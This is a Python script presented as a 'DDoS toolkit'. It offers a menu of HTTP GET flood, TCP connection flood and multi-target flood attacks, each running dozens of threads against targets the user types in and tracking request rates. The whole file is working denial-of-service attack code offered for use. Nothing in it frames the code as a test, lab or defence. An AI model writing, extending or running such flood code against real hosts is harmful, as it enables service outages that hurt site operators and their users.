#!/usr/bin/env python3
import threading
import time
import random
import sys
import os
import socket
from datetime import datetime

class SimpleDDoSToolkit:
    def __init__(self):
        self.request_count = 0
        self.success_count = 0
        self.error_count = 0
        self.start_time = None
        self.running = False
        
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def show_banner(self):
        self.clear_screen()
        print("╔══════════════════════════════════════════════════════════════╗")
        print("║                🚀 PYTHON DDoS TOOLKIT 2025                ║")
        print("║                  ⚡ ADVANCED CYBER FRAMEWORK                ║")
        print("╚══════════════════════════════════════════════════════════════╝")
    
    def show_menu(self):
        print("\n📋 ATTACK METHODS:")
        print("─" * 60)
        print("   1️⃣  🎯 HTTP Flood (GET)")
        print("   2️⃣  🌐 TCP Flood")
        print("   3️⃣  🔄 Multi-Target Attack")
        print("   4️⃣  📊 Attack Statistics")
        print("   5️⃣  ❌ Exit")
        
        choice = input("\n⚡ Choose your option [1-5]: ")
        return choice
    
    def http_request(self, target, thread_id):
        """Simple HTTP request using socket"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)',
            'Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0'
        ]
        
        try:
            # Parse URL
            if not target.startswith(('http://', 'https://')):
                target = 'http://' + target
            
            if '://' in target:
                url = target.split('://', 1)[1]
            else:
                url = target
            
            host = url.split('/')[0]
            path = '/' + '/'.join(url.split('/')[1:]) if '/' in url else '/'
            
            # Create HTTP request
            headers = [
                f"GET {path} HTTP/1.1",
                f"Host: {host}",
                f"User-Agent: {random.choice(user_agents)}",
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language: en-US,en;q=0.5",
                "Accept-Encoding: gzip, deflate",
                "Connection: keep-alive",
                "Upgrade-Insecure-Requests: 1",
                "", ""
            ]
            
            request = "\r\n".join(headers)
            
            while self.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((host, 80))
                    sock.send(request.encode())
                    
                    response = sock.recv(1024)
                    sock.close()
                    
                    if response:
                        self.success_count += 1
                    else:
                        self.error_count += 1
                    
                    self.request_count += 1
                    
                except Exception:
                    self.error_count += 1
                
                time.sleep(0.01)  # Small delay
                
        except Exception as e:
            print(f"Thread {thread_id} error: {e}")
    
    def tcp_flood(self, target, port, thread_id):
        """TCP flood attack"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target, port))
                sock.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
                sock.close()
                
                self.success_count += 1
                self.request_count += 1
                
            except Exception:
                self.error_count += 1
            
            time.sleep(0.01)
    
    def monitor_progress(self):
        """Monitor attack progress"""
        while self.running:
            time.sleep(1)
            if self.start_time:
                elapsed = time.time() - self.start_time
                rps = self.request_count / elapsed if elapsed > 0 else 0
                print(f"\r🚀 Requests: {self.request_count:,} | ✅ Success: {self.success_count:,} | ❌ Errors: {self.error_count:,} | ⚡ RPS: {rps:.1f}", end='', flush=True)
    
    def http_flood_attack(self, target, duration=60, threads=50):
        """HTTP flood attack"""
        self.running = True
        self.start_time = time.time()
        
        print(f"\n🚀 Starting HTTP flood on {target}")
        print(f"📊 Duration: {duration}s | Threads: {threads}")
        print("Press Ctrl+C to stop...\n")
        
        # Start attack threads
        attack_threads = []
        for i in range(threads):
            thread = threading.Thread(target=self.http_request, args=(target, i))
            thread.daemon = True
            thread.start()
            attack_threads.append(thread)
        
        # Start monitor thread
        monitor_thread = threading.Thread(target=self.monitor_progress)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        try:
            # Wait for duration
            time.sleep(duration)
        except KeyboardInterrupt:
            print("\n❌ Attack stopped by user")
        finally:
            self.running = False
            
            # Wait for threads to finish
            for thread in attack_threads:
                thread.join(timeout=1)
        
        print(f"\n\n✅ Attack completed!")
        self.show_final_stats()
    
    def tcp_flood_attack(self, target, port=80, duration=60, threads=50):
        """TCP flood attack"""
        self.running = True
        self.start_time = time.time()
        
        print(f"\n🚀 Starting TCP flood on {target}:{port}")
        print(f"📊 Duration: {duration}s | Threads: {threads}")
        print("Press Ctrl+C to stop...\n")
        
        # Start attack threads
        attack_threads = []
        for i in range(threads):
            thread = threading.Thread(target=self.tcp_flood, args=(target, port, i))
            thread.daemon = True
            thread.start()
            attack_threads.append(thread)
        
        # Start monitor thread
        monitor_thread = threading.Thread(target=self.monitor_progress)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        try:
            # Wait for duration
            time.sleep(duration)
        except KeyboardInterrupt:
            print("\n❌ Attack stopped by user")
        finally:
            self.running = False
            
            # Wait for threads to finish
            for thread in attack_threads:
                thread.join(timeout=1)
        
        print(f"\n\n✅ Attack completed!")
        self.show_final_stats()
    
    def show_final_stats(self):
        """Show final statistics"""
        if self.start_time:
            elapsed = time.time() - self.start_time
            rps = self.request_count / elapsed if elapsed > 0 else 0
            success_rate = (self.success_count / self.request_count * 100) if self.request_count > 0 else 0
            
            print(f"📈 Final Statistics:")
            print(f"⏱️  Duration: {elapsed:.1f} seconds")
            print(f"🚀 Total Requests: {self.request_count:,}")
            print(f"✅ Successful: {self.success_count:,}")
            print(f"❌ Failed: {self.error_count:,}")
            print(f"📊 Success Rate: {success_rate:.2f}%")
            print(f"⚡ Average RPS: {rps:.1f}")
    
    def single_target_attack(self):
        """Single target attack"""
        print("\n🎯 SINGLE TARGET ATTACK")
        
        target = input("🎯 Enter target URL or IP: ")
        if not target:
            print("❌ No target specified!")
            input("Press ENTER to return...")
            return
        
        duration = int(input("⏱️  Duration in seconds [60]: ") or "60")
        threads = int(input("🧵 Threads [50]: ") or "50")
        
        self.http_flood_attack(target, duration, threads)
        
        input("\nPress ENTER to return to menu...")
    
    def multi_target_attack(self):
        """Multi-target attack"""
        print("\n🌐 MULTI-TARGET ATTACK")
        
        print("📋 Enter targets (one per line, empty line to finish):")
        targets = []
        
        while True:
            target = input(f"Target {len(targets) + 1}: ")
            if not target:
                break
            targets.append(target)
        
        if not targets:
            print("❌ No targets specified!")
            input("Press ENTER to return...")
            return
        
        duration = int(input("⏱️  Duration in seconds [60]: ") or "60")
        threads_per_target = int(input("🧵 Threads per target [25]: ") or "25")
        
        print(f"\n🚀 Starting attack on {len(targets)} targets")
        
        # Reset counters
        self.request_count = 0
        self.success_count = 0
        self.error_count = 0
        self.running = True
        self.start_time = time.time()
        
        # Start attacks for each target
        attack_threads = []
        for target in targets:
            for i in range(threads_per_target):
                thread = threading.Thread(target=self.http_request, args=(target, f"{target}_{i}"))
                thread.daemon = True
                thread.start()
                attack_threads.append(thread)
        
        # Start monitor thread
        monitor_thread = threading.Thread(target=self.monitor_progress)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            print("\n❌ Attack stopped by user")
        finally:
            self.running = False
            
            for thread in attack_threads:
                thread.join(timeout=1)
        
        print(f"\n\n✅ Multi-target attack completed!")
        self.show_final_stats()
        
        input("\nPress ENTER to return to menu...")
    
    def show_statistics(self):
        """Show attack statistics"""
        self.clear_screen()
        print("📊 ATTACK STATISTICS")
        
        if self.start_time:
            self.show_final_stats()
        else:
            print("\n❌ No attack statistics available")
        
        input("\nPress ENTER to return to menu...")
    
    def run(self):
        """Main program loop"""
        while True:
            self.show_banner()
            choice = self.show_menu()
            
            if choice == "1":
                self.single_target_attack()
            elif choice == "2":
                self.tcp_flood_attack("127.0.0.1", 80, 60, 50)
                input("\nPress ENTER to return to menu...")
            elif choice == "3":
                self.multi_target_attack()
            elif choice == "4":
                self.show_statistics()
            elif choice == "5":
                print("\n👋 Shutting down...")
                break
            else:
                print("❌ Invalid option! Please choose 1-5")
                time.sleep(2)

def main():
    toolkit = SimpleDDoSToolkit()
    
    try:
        toolkit.run()
    except KeyboardInterrupt:
        print("\n👋 Goodbye!")
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    main()